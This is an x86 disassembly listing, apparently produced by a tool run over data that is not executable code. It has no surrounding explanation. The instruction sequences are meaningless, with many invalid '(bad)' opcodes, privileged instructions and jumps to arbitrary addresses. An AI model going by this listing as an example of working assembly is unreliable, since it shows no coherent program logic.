  41fc96:	lods   al,BYTE PTR ds:[esi]
  41fc97:	fist   DWORD PTR [esp+edi*1-0x19]
  41fc9b:	shr    ebx,0x92
  41fc9e:	mov    edi,0xc21ce75c
  41fca3:	(bad)  
  41fca4:	dec    edx
  41fca5:	in     eax,dx
  41fca6:	sub    edx,esp
  41fca8:	dec    eax
  41fca9:	icebp  
  41fcaa:	xor    DWORD PTR [esi-0x7a],ebp
  41fcad:	test   eax,0xa818ebf
  41fcb2:	push   ds
  41fcb3:	pushw  0xffc6
  41fcb6:	test   eax,0xc4b1d756
  41fcbb:	and    al,0xfc
  41fcbd:	push   0x648ea0d6
  41fcc2:	sub    BYTE PTR [esi],al
  41fcc4:	and    BYTE PTR [ecx+0x39],0xd0
  41fcc8:	pusha  
  41fcc9:	adc    DWORD PTR [ebx+0x3e],edi
  41fccc:	xor    ah,al
  41fcce:	ja     0x41fcc1
  41fcd0:	popa   
  41fcd1:	ret    
  41fcd2:	dec    edi
  41fcd3:	retf   
  41fcd4:	xchg   BYTE PTR [esi-0xd],cl
  41fcd7:	push   ss
  41fcd8:	out    dx,al
  41fcd9:	cmc    
  41fcda:	sbb    eax,0x8c6d9fe6
  41fcdf:	lods   eax,DWORD PTR ds:[esi]
  41fce0:	(bad)  
  41fce1:	aad    0xab
  41fce3:	lock push ebx
  41fce5:	jecxz  0x41fd43
  41fce7:	stos   BYTE PTR es:[edi],al
  41fce8:	add    eax,0x74578263
  41fced:	adc    eax,0x2c2d4575
  41fcf2:	mov    edx,0xa2f800ea
  41fcf7:	icebp  
  41fcf8:	pop    ds
  41fcf9:	or     al,0x7d
  41fcfb:	loope  0x41fcab
  41fcfd:	xchg   ebx,eax
  41fcfe:	and    BYTE PTR [esi+0x58],cl
  41fd01:	mov    esp,0x12decba2
  41fd06:	psubsb mm0,mm0
  41fd09:	jmp    0x45019109
  41fd0e:	jecxz  0x41fc91
  41fd10:	sbb    al,0x5
  41fd12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd13:	daa    
  41fd14:	mov    al,0x84
  41fd16:	popa   
  41fd17:	sbb    DWORD PTR [esi],0xd06ba0da
  41fd1d:	jmp    0x834:0x3dbe4c23
  41fd24:	inc    esi
  41fd25:	nop
  41fd26:	(bad)  
  41fd27:	lahf   
  41fd28:	sar    DWORD PTR ds:[edi],cl
  41fd2b:	push   ebx
  41fd2c:	mov    al,ds:0xe329e1a5
  41fd31:	mov    al,0x23
  41fd33:	sbb    DWORD PTR [eax],esi
  41fd35:	mov    ebp,0xa80fe34b
  41fd3a:	sub    al,0xeb
  41fd3c:	aaa    
  41fd3d:	add    eax,0x43672a8
  41fd42:	push   edi
  41fd43:	test   eax,0x60a2ba9a
  41fd48:	idiv   ecx
  41fd4a:	cmp    ebp,DWORD PTR [ebx+ebx*4]
  41fd4d:	clc    
  41fd4e:	inc    esi
  41fd4f:	sar    DWORD PTR [esi-0x370b7f11],0xd0
  41fd56:	sub    BYTE PTR [ecx],bh
  41fd58:	addr16 push ds
  41fd5a:	cmp    esi,DWORD PTR [edx]
  41fd5c:	popa   
  41fd5d:	jmp    0x41fda4
  41fd5f:	mov    ecx,0xfcb8e54c
  41fd64:	ror    BYTE PTR [edi+0x471cd319],0x7f
  41fd6b:	mov    WORD PTR [ebx-0x1],?
  41fd6e:	mov    esp,0xa3f79951
  41fd73:	mov    BYTE PTR [ecx+edi*8+0x7fcb7056],0x58
  41fd7b:	ja     0x41fd25
  41fd7d:	jne    0x41fdb5
  41fd7f:	mov    ecx,0xbe422060
  41fd84:	idiv   DWORD PTR [edi+0x6314c1f9]
  41fd8a:	adc    DWORD PTR [edx],eax
  41fd8c:	out    dx,al
  41fd8d:	adc    esi,DWORD PTR [esi+0x16]
  41fd90:	ins    DWORD PTR es:[edi],dx
  41fd91:	lock jge 0x41fd31
  41fd94:	dec    ecx
  41fd95:	adc    ebx,DWORD PTR [edx+0x5fca88c4]
  41fd9b:	clc    
  41fd9c:	(bad)  
  41fd9d:	int3   
  41fd9e:	nop
  41fd9f:	mov    ecx,0x9b4e999b
  41fda4:	push   ebx
  41fda5:	mov    al,ds:0xe003949b
  41fdaa:	jg     0x41fd38
  41fdac:	scas   eax,DWORD PTR es:[edi]
  41fdad:	mov    eax,0xb0d0b810
  41fdb2:	inc    ebx
  41fdb3:	push   edi
  41fdb4:	push   cs
  41fdb5:	pop    esp
  41fdb6:	or     BYTE PTR [ecx],bh
  41fdb8:	push   es
  41fdb9:	mov    cl,al
  41fdbb:	xor    cl,BYTE PTR ds:0xe6078d14
  41fdc1:	int    0x7f
  41fdc3:	ror    ecx,1
  41fdc5:	fxch   st(2)
  41fdc7:	gs inc ebx
  41fdc9:	sbb    al,0xcf
  41fdcc:	pop    esi
  41fdcd:	push   es
  41fdce:	je     0x41fde3
  41fdd0:	dec    esi
  41fdd1:	test   eax,0x7e221588
  41fdd6:	xchg   edx,eax
  41fdd7:	mov    bh,0xd1
  41fdd9:	pop    ss
  41fdda:	mov    bl,0x3b
  41fddc:	or     cl,BYTE PTR [ecx+0x47f8ca3]
  41fde2:	ret    0xaab5
  41fde5:	add    al,0xd5
  41fde7:	rcl    DWORD PTR [esi-0x18],cl
  41fdea:	adc    eax,0x96f8b80f
  41fdef:	arpl   WORD PTR [esp+edx*2+0x1c],cx
  41fdf3:	mov    bh,0x3e
  41fdf5:	mov    bl,0xea
  41fdf7:	stos   BYTE PTR es:[edi],al
  41fdf8:	sub    al,0x6a
  41fdfa:	and    al,0xcd
  41fdfc:	dec    ebx
  41fdfd:	je     0x41fda0
  41fdff:	rcr    DWORD PTR [ecx],1
  41fe01:	dec    esi
  41fe02:	mov    eax,ds:0x63592a7d
  41fe07:	push   esi
  41fe08:	adc    al,0xf8
  41fe0a:	mov    ebp,0xf8f1c3f0
  41fe0f:	fadd   QWORD PTR [ecx]
  41fe11:	and    al,0xb8
  41fe13:	or     al,0x90
  41fe15:	retf   0x9c49
  41fe18:	pusha  
  41fe19:	adc    ebx,DWORD PTR [ebx-0x754cace8]
  41fe1f:	inc    ebx
  41fe20:	xor    DWORD PTR [esi+0x29810eea],eax
  41fe26:	in     eax,dx
  41fe27:	xchg   ebp,eax
  41fe28:	fdivr  QWORD PTR [esi]
  41fe2a:	dec    ebp
  41fe2b:	dec    edx
  41fe2c:	popf   
  41fe2d:	jl     0x41fe7e
  41fe2f:	and    eax,0x50ab9701
  41fe34:	in     eax,0x15
  41fe36:	pusha  
  41fe37:	and    eax,0x2d1b38d7
  41fe3c:	pop    edx
  41fe3d:	stos   BYTE PTR es:[edi],al
  41fe3e:	dec    ebx
  41fe3f:	ja     0x41fe92
  41fe41:	test   al,0xe5
  41fe43:	inc    ebx
  41fe44:	cmp    ch,BYTE PTR [edi]
  41fe46:	cdq    
  41fe47:	lods   al,BYTE PTR ds:[esi]
  41fe48:	or     ebp,esi
  41fe4a:	aam    0xcc
  41fe4c:	mov    al,BYTE PTR [ebx+0x165dcde5]
  41fe52:	out    dx,al
  41fe53:	popa   
  41fe54:	and    ebp,DWORD PTR [edx+0xea4bdb0]
  41fe5a:	and    DWORD PTR [edx+esi*4-0x33b55a38],edx
  41fe61:	add    eax,0xd1db8566
  41fe66:	out    dx,eax
  41fe67:	cmp    edx,DWORD PTR [edx-0x6a61c51d]
  41fe6d:	add    edx,DWORD PTR [esi+eax*2+0x910225a]
  41fe74:	sub    BYTE PTR [edi],dl
  41fe76:	mov    DWORD PTR [ecx-0x5d],esp
  41fe79:	pop    ebx
  41fe7a:	xchg   ebp,eax
  41fe7b:	sub    ebp,edi
  41fe7d:	scas   al,BYTE PTR es:[edi]
  41fe7e:	aas    
  41fe7f:	cmc    
  41fe80:	xor    BYTE PTR [ecx+0x412b996e],dl
  41fe86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe87:	imul   eax,ecx,0x2cde29cc
  41fe8d:	imul   DWORD PTR [ecx]
  41fe8f:	or     BYTE PTR [ebx-0x72],0x7a
  41fe93:	inc    esp
  41fe94:	setae  BYTE PTR [esi]
  41fe97:	push   0xadfce76
  41fe9c:	test   al,0xbf
  41fe9e:	mov    cl,0xf6
  41fea0:	xchg   DWORD PTR [edi-0x6a36be91],ecx
  41fea6:	inc    ebp
  41fea7:	xor    al,BYTE PTR [eax+0x756ee524]
  41fead:	adc    eax,0xaee39859
  41feb2:	sti    
  41feb3:	imul   esp,DWORD PTR ss:[ebp+edi*2-0x57ade6d0],0xffffffbd
  41febc:	(bad)  
  41febd:	adc    DWORD PTR [edx],0x26698005
  41fec3:	sub    al,0xd5
  41fec5:	cmp    esi,edx
  41fec7:	mov    edi,0x3ec070e1
  41fecc:	pop    es
  41fecd:	(bad)
  41fed1:	jae    0x41fec9
  41fed3:	jge    0x41fe95
  41fed5:	push   ebx
  41fed6:	pop    ecx
  41fed7:	pop    ds
  41fed8:	dec    edx
  41fed9:	sub    DWORD PTR [eax],edx
  41fedb:	add    BYTE PTR [esi+0x27d2fe89],ah
  41fee1:	mov    eax,0xac5575b7
  41fee6:	xchg   ebx,eax
  41fee7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fee8:	cli    
  41fee9:	rol    esi,cl
  41feeb:	and    BYTE PTR [edi],dl
  41feed:	adc    esi,0x7d121ae
  41fef3:	daa    
  41fef4:	sub    esp,DWORD PTR [ecx-0x2b]
  41fef7:	mov    ch,0x3
  41fef9:	or     DWORD PTR [edi-0x22e53372],edi
  41feff:	fnstcw WORD PTR [esp+ecx*1]
  41ff02:	jne    0x41ff6c
  41ff04:	mov    ebp,0xa151ab59
  41ff09:	(bad)  
  41ff0b:	mov    ecx,0xaecdf87f
  41ff10:	xchg   ecx,eax
  41ff11:	call   0x19a:0x26d90251
  41ff18:	inc    eax
  41ff19:	mov    bh,0x48
  41ff1b:	adc    al,cl
  41ff1d:	inc    ecx
  41ff1e:	ds inc ebx
  41ff20:	add    esp,eax
  41ff22:	fs retf 0x931c
  41ff26:	stos   BYTE PTR es:[edi],al
  41ff27:	(bad)  
  41ff28:	sub    eax,0x7a28343e
  41ff2d:	cwde   
  41ff2e:	and    BYTE PTR [edi+0x6135f82c],ch
  41ff34:	mov    eax,0xba07797d
  41ff39:	and    ch,BYTE PTR [esi-0x4e]
  41ff3c:	adc    al,0xc9
  41ff3e:	mov    dh,bh
  41ff40:	fcom   DWORD PTR [eax+eiz*1+0x58]
  41ff44:	cld    
  41ff45:	and    eax,0xd09d3abc
  41ff4a:	cmp    esp,DWORD PTR [eax+0x40c02072]
  41ff50:	sub    bl,BYTE PTR [ebx+0x7009884a]
  41ff56:	push   0xffffff91
  41ff58:	xor    edx,edi
  41ff5a:	jae    0x41ffb5
  41ff5c:	jge    0x41ff06
  41ff5e:	pop    edi
  41ff5f:	mov    bl,0x23
  41ff61:	pop    edx
  41ff62:	inc    esp
  41ff63:	js     0x41ffb9
  41ff65:	dec    edi
  41ff66:	popa   
  41ff67:	test   esi,esp
  41ff69:	jg     0x41ff95
  41ff6b:	je     0x41fefd
  41ff6d:	in     eax,0xd1
  41ff6f:	ret    
  41ff70:	jle    0x41ff5a
  41ff72:	push   edi
  41ff73:	jbe    0x41ff02
  41ff75:	mov    dh,bl
  41ff77:	aas    
  41ff78:	or     al,0x18
  41ff7a:	sub    DWORD PTR [edi],0x7f442ac6
  41ff80:	into   
  41ff81:	into   
  41ff82:	sub    BYTE PTR [eax],al
  41ff84:	adc    DWORD PTR [esi],esp
  41ff86:	jl     0x41ff19
  41ff88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff89:	push   edx
  41ff8a:	cwde   
  41ff8b:	shr    BYTE PTR [esi+edx*1-0x3d],cl
  41ff8f:	mov    ds:0x9117d0da,eax
  41ff94:	dec    DWORD PTR [ecx]
  41ff96:	xor    esp,DWORD PTR [esi-0x15]
  41ff99:	retf   0x717f
  41ff9c:	in     eax,dx
  41ff9d:	mov    bh,0x82
  41ff9f:	in     eax,dx
  41ffa0:	aad    0xa9
  41ffa2:	sbb    bh,BYTE PTR [edx-0x6851d4d6]
  41ffa8:	inc    edx
  41ffa9:	popa   
  41ffaa:	pop    ds
  41ffab:	xchg   ebp,eax
  41ffac:	jp     0x41ffc6
  41ffae:	sub    edi,DWORD PTR [esi+0x23cc6161]
  41ffb4:	pushf  
  41ffb5:	pop    esi
  41ffb6:	mov    bl,0xad
  41ffb8:	fistp  DWORD PTR [edi+ecx*1+0x1946a998]
  41ffc0:	add    BYTE PTR [esi],al
  41ffc2:	sub    ebp,DWORD PTR [eax]
  41ffc4:	hlt    
  41ffc5:	mov    bl,0x3a
  41ffc7:	test   eax,0xac8cf67
  41ffcc:	push   cs
  41ffcd:	inc    sp
  41ffcf:	mov    dh,0xd3
  41ffd1:	inc    edi
  41ffd2:	dec    eax
  41ffd3:	adc    ecx,ebp
  41ffd5:	mov    ebx,0x2a86c0f3
  41ffda:	mov    BYTE PTR [ebp-0x23],al
  41ffdd:	stos   BYTE PTR es:[edi],al
  41ffde:	lods   al,BYTE PTR ds:[esi]
  41ffdf:	mov    edx,0x627dec0c
  41ffe4:	jno    0x41ff6d
  41ffe6:	cmp    eax,0x66c35a2f
  41ffeb:	out    0xe3,eax
  41ffed:	jg     0x41ff78
  41ffef:	pushf  
  41fff0:	push   esp
  41fff1:	neg    DWORD PTR [esi-0x7792f5d]
  41fff7:	nop
  41fff8:	mov    edx,0x3ecb17ff
  41fffd:	inc    edi
  41fffe:	bound  eax,QWORD PTR [edi-0x79]
  420001:	cmp    edx,0xffffffe5
  420004:	mov    al,ds:0x58af2e5
  420009:	cwde   
  42000a:	sub    DWORD PTR [ebx],edx
  42000c:	mov    esp,0x4862b9bb
  420011:	inc    esp
  420012:	dec    ecx
  420013:	mov    edx,0x18321187
  420018:	jo     0x420007
  42001a:	push   0x4695f163
  42001f:	sub    esi,DWORD PTR [ebx]
  420021:	fwait
  420022:	mov    ebx,0x66136f8c
  420027:	adc    eax,0xee987932
  42002c:	sbb    BYTE PTR [ebp+0x5],dl
  42002f:	addr16 or dh,al
  420032:	ja     0x420039
  420034:	jmp    0x41ffd3
  420036:	xor    ah,bl
  420038:	lea    esi,[eax+0x1]
  42003b:	ror    DWORD PTR [eax],1
  42003d:	fmul   QWORD PTR [esi]
  42003f:	push   esp
  420040:	inc    edi
  420041:	mov    ah,0x80
  420043:	cmc    
  420044:	push   cs
  420045:	adc    dl,BYTE PTR [edi]
  420047:	iret   
  420048:	loop   0x41ffd9
  42004a:	mov    esp,0xf481e12b
  42004f:	xor    esp,DWORD PTR [edi+0x35]
  420052:	jg     0x41ffe6
  420054:	cwde   
  420055:	lods   al,BYTE PTR ds:[esi]
  420056:	mov    ah,0x15
  420058:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420059:	inc    ebx
  42005a:	in     al,dx
  42005b:	sbb    DWORD PTR [edi-0xff6f83d],esp
  420061:	and    eax,edi
  420063:	xlat   BYTE PTR ds:[ebx]
  420064:	ss mov ebp,0x811aa2f9
  42006a:	adc    al,0xaa
  42006c:	push   ecx
  42006d:	mov    eax,ss:0xa51ec01f
  420073:	daa    
  420074:	stc    
  420075:	push   ebp
  420076:	xor    eax,ecx
  420078:	mov    edx,0xd7c80084
  42007d:	mov    ss,WORD PTR [edx+0x47313ac1]
  420083:	sub    DWORD PTR [ebp+0xb040c0f],ecx
  420089:	outs   dx,BYTE PTR ds:[esi]
  42008a:	call   0x50f4:0x9da3812b
  420091:	test   BYTE PTR [ecx+ebx*4+0x640d5b48],bl
  420098:	inc    ebx
  420099:	enter  0x3a34,0x4d
  42009d:	and    DWORD PTR ds:0x4d3413c5,ebx
  4200a3:	inc    ebx
  4200a4:	lods   al,BYTE PTR ds:[esi]
  4200a5:	(bad)
  4200a8:	jb     0x42007d
  4200aa:	repnz or eax,esi
  4200ad:	mov    ds,WORD PTR [eax]
  4200af:	jmp    0x4200a9
  4200b1:	fst    DWORD PTR [edx-0x47f34a85]
  4200b7:	jmp    0x2c897ba6
  4200bc:	inc    edi
  4200bd:	mov    WORD PTR fs:[esp+esi*4-0x4b431c31],ss
  4200c5:	ds mov ebx,0xb66a20d6
  4200cb:	sbb    eax,0xfcc738bc
  4200d0:	cmp    BYTE PTR [esi],ah
  4200d2:	pop    ss
  4200d3:	inc    esi
  4200d4:	and    al,0x0
  4200d6:	cmp    al,0xb6
  4200d8:	fmul   DWORD PTR [eax-0x4e]
  4200db:	sub    eax,0xcb236a15
  4200e0:	hlt    
  4200e1:	sbb    esi,ebp
  4200e3:	out    dx,eax
  4200e4:	jno    0x420151
  4200e6:	pop    ecx
  4200e7:	(bad)  
  4200e9:	imul   ebx,DWORD PTR [edx-0x62],0x6a4291b6
  4200f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200f1:	les    ebp,FWORD PTR [ebx+0xe7b87f]
  4200f7:	idiv   ebp
  4200f9:	dec    esp
  4200fa:	sbb    al,0x3
  4200fc:	sbb    BYTE PTR [esi+0x7d20e248],dl
  420102:	ret    
  420103:	mov    bl,0x9c
  420105:	data16 js 0x42015c
  420108:	xchg   edi,eax
  420109:	dec    eax
  42010a:	sbb    BYTE PTR [eax+0x17f13927],0x8a
  420111:	lods   eax,DWORD PTR ds:[esi]
  420112:	adc    al,0x9b
  420114:	sbb    edx,DWORD PTR [ecx-0x33ae82f3]
  42011a:	mov    ah,0x76
  42011c:	cld    
  42011d:	in     al,0x48
  42011f:	pop    edx
  420120:	shr    BYTE PTR [edi],0xfe
  420123:	lods   al,BYTE PTR ds:[esi]
  420124:	loope  0x420120
  420126:	and    BYTE PTR [ebx+ebp*4+0x43],bh
  42012a:	(bad)
  42012d:	sub    al,cl
  42012f:	adc    al,BYTE PTR [eax+0x17226760]
  420135:	lahf   
  420136:	data16 int 0xa0
  420139:	mov    bh,0x86
  42013b:	adc    BYTE PTR [ecx-0x39d05ba4],bh
  420141:	js     0x420101
  420143:	test   eax,0x452b566b
  420148:	mov    BYTE PTR [ecx-0x24d8002f],ch
  42014e:	push   cs
  42014f:	retf   0x21e2
  420152:	and    eax,0x4df9080b
  420157:	sahf   
  420158:	lds    ebp,FWORD PTR [ebp+0x6]
  42015b:	pusha  
  42015c:	or     BYTE PTR [edi],0xb2
  42015f:	aad    0x80
  420161:	sahf   
  420162:	and    bh,0xc2
  420165:	shl    DWORD PTR [ebx-0x33],0x93
  420169:	test   eax,0xd5b7bb40
  42016e:	push   ss
  42016f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420170:	in     eax,0xaf
  420172:	xchg   BYTE PTR [ebx],cl
  420174:	sbb    edx,edx
  420176:	sub    DWORD PTR [ebx+0x6fa9339d],0xd9a42ac0
  420180:	or     dh,BYTE PTR [ebp-0x17273389]
  420186:	pop    esp
  420187:	fwait
  420188:	rcr    BYTE PTR [eax+eiz*8+0x20],cl
  42018c:	cmp    BYTE PTR [eax],0x63
  42018f:	xchg   edx,eax
  420190:	in     eax,0xd7
  420192:	aam    0x4b
  420194:	fstp   TBYTE PTR [ebp*4-0x428561ca]
  42019b:	ret    0x9469
  42019e:	fnstsw WORD PTR [edx-0x11]
  4201a1:	dec    ecx
  4201a2:	(bad)  
  4201a3:	mov    BYTE PTR [esi],0x2a
  4201a6:	es hlt 
  4201a8:	out    0x5a,eax
  4201aa:	add    bh,BYTE PTR [ecx+0x43caebd3]
  4201b0:	mov    esi,0x85fb861e
  4201b5:	stos   BYTE PTR es:[edi],al
  4201b6:	sub    ah,al
  4201b8:	sub    DWORD PTR [eax-0x24],ebx
  4201bb:	shr    DWORD PTR [eax],cl
  4201bd:	inc    edx
  4201be:	fcom   st(3)
  4201c0:	adc    edi,edi
  4201c2:	adc    eax,0x4e95f90
  4201c7:	mov    eax,0xbf654f0b
  4201cc:	xor    al,dl
  4201ce:	adc    esi,esp
  4201d0:	jno    0x420187
  4201d2:	jmp    0xf2c96ed
  4201d7:	inc    ebx
  4201d8:	dec    esp
  4201d9:	les    esi,FWORD PTR [ecx]
  4201db:	add    eax,0xec08e503
  4201e0:	mov    fs,WORD PTR [edx-0x79]
  4201e3:	sbb    DWORD PTR [ebp+0x460c76f0],edx
  4201e9:	ja     0x420261
  4201eb:	bnd jns 0x420215
  4201ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201ef:	sub    al,0xee
  4201f1:	adc    dl,BYTE PTR [edx]
  4201f3:	outs   dx,DWORD PTR ds:[esi]
  4201f4:	icebp  
  4201f5:	pop    edi
  4201f6:	push   0x127e168
  4201fb:	in     al,0x1c
  4201fd:	push   ecx
  4201fe:	xchg   edx,eax
  4201ff:	(bad)  
  420200:	les    edx,FWORD PTR [esi+0x1b6e3222]
  420206:	leave  
  420207:	xor    ecx,DWORD PTR [eax+0x106437f]
  42020d:	or     BYTE PTR [ecx-0x154a4747],dl
  420213:	mov    BYTE PTR [eax],ch
  420215:	gs into 
  420217:	out    0x11,al
  420219:	retf   0x3ac8
  42021c:	in     al,dx
  42021d:	test   bl,dl
  42021f:	inc    eax
  420220:	pop    edi
  420221:	xchg   edx,eax
  420222:	xchg   edi,eax
  420223:	cdq    
  420224:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420226:	pop    ds
  420227:	adc    BYTE PTR [ebp-0x12eae7d7],bh
  42022d:	int3   
  42022e:	cwde   
  42022f:	inc    edi
  420230:	mov    dl,0x28
  420232:	jno    0x42025f
  420234:	dec    ecx
  420235:	xor    edi,edi
  420237:	sub    al,0x9b
  420239:	adc    dl,BYTE PTR [ebx+0x27616240]
  42023f:	dec    edi
  420240:	or     BYTE PTR [esi-0x71],0x6e
  420244:	and    edi,DWORD PTR [ebx-0x56633b0c]
  42024a:	popf   
  42024b:	aaa    
  42024c:	sbb    bh,BYTE PTR [edx]
  42024e:	js     0x4201e1
  420250:	stos   DWORD PTR es:[edi],eax
  420251:	lahf   
  420252:	add    eax,ebx
  420254:	xchg   ebx,eax
  420255:	and    DWORD PTR [ebx+0x5702231],0xf83b063b
  42025f:	shl    bh,0x91
  420262:	nop
  420263:	ds mov esi,0xae146d1a
  420269:	jo     0x420231
  42026b:	jbe    0x4202dc
  42026d:	loope  0x420248
  42026f:	sub    eax,0xa5b52aa4
  420274:	lock dec edx
  420276:	lods   eax,DWORD PTR ds:[esi]
  420277:	(bad)  
  420278:	sti    
  420279:	dec    edi
  42027a:	sahf   
  42027b:	and    al,BYTE PTR [ebp-0x37]
  42027e:	ret    0x5277
  420281:	fdivr  QWORD PTR [ebx+0x4d]
  420284:	jns    0x42022a
  420286:	cmp    esi,DWORD PTR [edi+ebp*1-0x63]
  42028a:	push   esp
  42028b:	cwde   
  42028c:	dec    eax
  42028d:	test   al,0x4a
  42028f:	xchg   ebp,eax
  420290:	call   0xd96d:0xa484ad0a
  420297:	stc    
  420298:	and    ecx,DWORD PTR [bp+0x79]
  42029c:	mov    ecx,0x3c947dee
  4202a1:	mov    cl,0xec
  4202a3:	push   edx
  4202a4:	dec    esp
  4202a5:	int3   
  4202a6:	cmp    al,0x91
  4202a8:	je     0x4202ef
  4202aa:	hlt    
  4202ab:	pop    esp
  4202ac:	add    esi,DWORD PTR [ecx]
  4202ae:	push   ds
  4202af:	lock dec ebp
  4202b1:	pop    ebx
  4202b2:	xchg   edi,eax
  4202b3:	xchg   edi,eax
  4202b4:	(bad)  
  4202b5:	aad    0x15
  4202b7:	push   0xc8178f12
  4202bc:	sub    eax,0x6cffad0e
  4202c1:	popa   
  4202c2:	and    BYTE PTR [esi],dh
  4202c4:	sahf   
  4202c5:	icebp  
  4202c6:	push   cs
  4202c7:	daa    
  4202c8:	ja     0x42033e
  4202ca:	div    DWORD PTR [edx+0x4aea129f]
  4202d0:	mov    dh,BYTE PTR [esi-0x1c04e024]
  4202d6:	xor    BYTE PTR ds:0x58a6cae0,dh
  4202dc:	xchg   BYTE PTR [esi-0x4ef45e4d],al
  4202e2:	jno    0x4202e3
  4202e4:	mov    al,0xb1
  4202e6:	adc    eax,0x17e591da
  4202eb:	fmul   DWORD PTR [edi+0x24]
  4202ee:	sbb    BYTE PTR [eax-0xd688fe0],ch
  4202f4:	adc    BYTE PTR ds:0xec043182,bl
  4202fa:	mov    esp,0x2bd7f6ab
  4202ff:	imul   esi,DWORD PTR [ebx-0x7f8a7532],0x37848a07
  420309:	out    0x7c,al
  42030b:	fbstp  TBYTE PTR [eax+0x46]
  42030e:	data16 daa 
  420310:	pop    ebp
  420311:	test   BYTE PTR [edx-0x1],ch
  420314:	stc    
  420315:	outs   dx,DWORD PTR ds:[esi]
  420316:	ret    
  420317:	pushf  
  420318:	(bad)
  42031b:	inc    eax
  42031c:	add    ebp,DWORD PTR ds:0xd42a1e56
  420322:	mov    ds:0xf5144cc5,eax
  420327:	fldenv [ebx]
  420329:	ss sub al,0x7e
  42032c:	cmp    esi,0xa393080
  420332:	adc    eax,DWORD PTR ds:0xbee1f1e0
  420338:	mov    edx,0xe2d366a6
  42033d:	ins    BYTE PTR es:[edi],dx
  42033e:	(bad)  
  42033f:	enter  0x3f18,0xf8
  420343:	jge    0x4202fd
  420345:	push   es
  420346:	js     0x420315
  420348:	add    BYTE PTR [ecx-0x48],dh
  42034b:	jecxz  0x420374
  42034d:	int3   
  42034e:	sar    BYTE PTR [edi],cl
  420350:	daa    
  420351:	push   esi
  420352:	dec    eax
  420354:	xchg   edi,eax
  420355:	mov    ds:0xc20ee735,eax
  42035a:	mov    cl,0x1
  42035c:	inc    ebp
  42035d:	scas   al,BYTE PTR es:[edi]
  42035e:	add    BYTE PTR [eax-0x40],0x23
  420362:	push   esp
  420363:	stos   DWORD PTR es:[edi],eax
  420364:	sbb    BYTE PTR [edx-0x23],0xcc
  420368:	mov    dl,0x88
  42036a:	dec    esi
  42036b:	popa   
  42036c:	push   ss
  42036d:	sbb    BYTE PTR [ebx+0x6a],al
  420370:	fadd   QWORD PTR [edx-0x16207b0c]
  420376:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420377:	sub    edx,ecx
  420379:	out    dx,eax
  42037a:	loope  0x4203f5
  42037c:	add    ch,BYTE PTR [eax]
  42037e:	popf   
  42037f:	and    BYTE PTR [ebx-0x77],ah
  420382:	loop   0x420321
  420384:	cld    
  420385:	add    BYTE PTR ds:0x66ac87a0,0xc6
  42038c:	icebp  
  42038d:	dec    ebp
  42038e:	stos   BYTE PTR es:[edi],al
  42038f:	add    al,0xd
  420391:	test   DWORD PTR [edi+0xa5974fb],esp
  420397:	cdq    
  420398:	das    
  420399:	fbld   TBYTE PTR [edx+0x36ff6929]
  42039f:	xchg   DWORD PTR [ecx],esp
  4203a1:	sub    eax,0x6c3bcca0
  4203a6:	mov    edi,0x376ba1d4
  4203ab:	xchg   ecx,eax
  4203ac:	add    al,0xd1
  4203ae:	push   cs
  4203af:	test   ah,0xa5
  4203b2:	scas   al,BYTE PTR es:[edi]
  4203b3:	pop    ds
  4203b4:	(bad)  
  4203b5:	push   ebx
  4203b6:	inc    ebp
  4203b7:	std    
  4203b8:	jno    0x420379
  4203ba:	int3   
  4203bb:	std    
  4203bc:	mov    ds:0x2d3a0640,al
  4203c1:	(bad)  
  4203c2:	mov    bh,0xe
  4203c4:	cmp    al,0x29
  4203c6:	mov    dh,0xd1
  4203c8:	or     al,dl
  4203ca:	pushf  
  4203cb:	sub    esp,esi
  4203cd:	mov    dh,BYTE PTR [edi-0x4d]
  4203d0:	pop    esi
  4203d1:	fsubr  DWORD PTR ds:[edi]
  4203d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4203d5:	push   ds
  4203d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203d7:	test   al,0x7
  4203d9:	cwde   
  4203da:	iret   
  4203db:	cwde   
  4203dc:	inc    ecx
  4203dd:	pop    ebx
  4203de:	cwde   
  4203df:	mov    cl,0xb4
  4203e1:	rcr    DWORD PTR [ecx+0x2c],cl
  4203e4:	jl     0x4203b2
  4203e6:	in     eax,0x36
  4203e8:	mov    ebp,0x686bc008
  4203ed:	sub    al,0x52
  4203ef:	mov    ds:0xe43c5901,eax
  4203f4:	aas    
  4203f5:	rcr    esp,1
  4203f7:	mov    edx,0xaaa1afc7
  4203fc:	enter  0xef6e,0x2e
  420400:	call   0xd07aa65c
  420405:	mov    esp,0xee9d8992
  42040a:	inc    edi
  42040b:	sbb    al,0x48
  42040d:	pop    esp
  42040e:	or     ecx,DWORD PTR [edx-0x43]
  420411:	sub    DWORD PTR [eax-0x57245177],ecx
  420417:	mov    ds:0xc52cbe22,al
  42041c:	mov    BYTE PTR [edx-0x7e],dh
  42041f:	fnstsw WORD PTR [ecx]
  420421:	jmp    0x40762808
  420426:	jg     0x420494
  420428:	jnp    0x420484
  42042a:	stos   BYTE PTR es:[edi],al
  42042b:	jle    0x420462
  42042d:	jb     0x420410
  42042f:	fstp   DWORD PTR [edi-0x6042e6b9]
  420435:	(bad)  
  420437:	dec    esp
  420438:	scas   eax,DWORD PTR es:[edi]
  420439:	repnz not edi
  42043c:	mov    BYTE PTR [esi],bl
  42043e:	cli    
  42043f:	lea    edi,[eax]
  420441:	push   0xffffffb3
  420443:	mov    BYTE PTR [ebx],0x68
  420446:	add    DWORD PTR [eax+0x2],esi
  420449:	xchg   edi,esp
  42044b:	aaa    
  42044c:	jno    0x4203df
  42044e:	add    edx,DWORD PTR [ebx]
  420450:	cmp    DWORD PTR [eax+0x7a],edx
  420453:	add    al,0x5e
  420455:	xor    DWORD PTR [esp+ebx*4-0x7fedd82b],0x19
  42045d:	mov    al,0x8a
  42045f:	xchg   esp,eax
  420460:	retf   0x9262
  420463:	dec    ecx
  420464:	iret   
  420465:	hlt    
  420466:	and    eax,0xbe3fcdb0
